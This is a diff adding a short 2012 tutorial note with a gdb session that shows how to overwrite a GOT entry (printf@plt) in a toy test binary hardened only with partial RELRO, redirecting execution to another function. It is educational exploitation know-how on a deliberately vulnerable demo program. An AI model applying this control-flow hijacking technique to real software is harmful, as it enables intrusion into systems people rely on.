@@ -1,0 +1,43 @@
+Shawn the R0ck - Nov 12, 2012
+
+This program is going to show you how to overwrite the GOT while the
+binary was hardening with partially RELO. It's easy to understand,
+just read the fuc*ing source code! If you wanna try the real life
+shit, you need to hack harder!
+
+shawn@bt:/tmp/SCFE/security/overwrite_GOT$ gdb ./partial_relro_test -q
+Reading symbols from /tmpSCFE/security/overwrite_GOT/partial_relro_test...(no debugging symbols found)...done.
+(gdb) disassemble main
+Dump of assembler code for function main:
+   0x08048468 <+0>:	push   %ebp
+   0x08048469 <+1>:	mov    %esp,%ebp
+   0x0804846b <+3>:	and    $0xfffffff0,%esp
+   0x0804846e <+6>:	sub    $0x20,%esp
+   0x08048471 <+9>:	mov    0xc(%ebp),%eax
+   0x08048474 <+12>:	add    $0x4,%eax
+   0x08048477 <+15>:	mov    (%eax),%eax
+   0x08048479 <+17>:	movl   $0x10,0x8(%esp)
+   0x08048481 <+25>:	movl   $0x0,0x4(%esp)
+   0x08048489 <+33>:	mov    %eax,(%esp)
+   0x0804848c <+36>:	call   0x8048364 <strtol@plt>
+   0x08048491 <+41>:	mov    %eax,0x1c(%esp)
+   0x08048495 <+45>:	mov    0x1c(%esp),%eax
+   0x08048499 <+49>:	movl   $0x8048454,(%eax)
+   0x0804849f <+55>:	mov    $0x8048585,%eax
+   0x080484a4 <+60>:	mov    0x1c(%esp),%edx
+   0x080484a8 <+64>:	mov    %edx,0x4(%esp)
+   0x080484ac <+68>:	mov    %eax,(%esp)
+   0x080484af <+71>:	call   0x8048374 <printf@plt>
+   0x080484b4 <+76>:	mov    $0x0,%eax
+   0x080484b9 <+81>:	leave  
+   0x080484ba <+82>:	ret    
+End of assembler dump.
+(gdb) x/i 0x8048374
+   0x8048374 <printf@plt>:	jmp    *0x804a00c
+(gdb) x 0x804a00c
+   0x804a00c <_GLOBAL_OFFSET_TABLE_+24>:	jp     0x8049f91 <_DYNAMIC+113>
+(gdb) r 804a00c
+Starting program: /tmp/SCFE/security/overwrite_GOT/partial_relro_test 804a00c
+WTH! ===> This is what we hack for...
+
+Program exited normally.
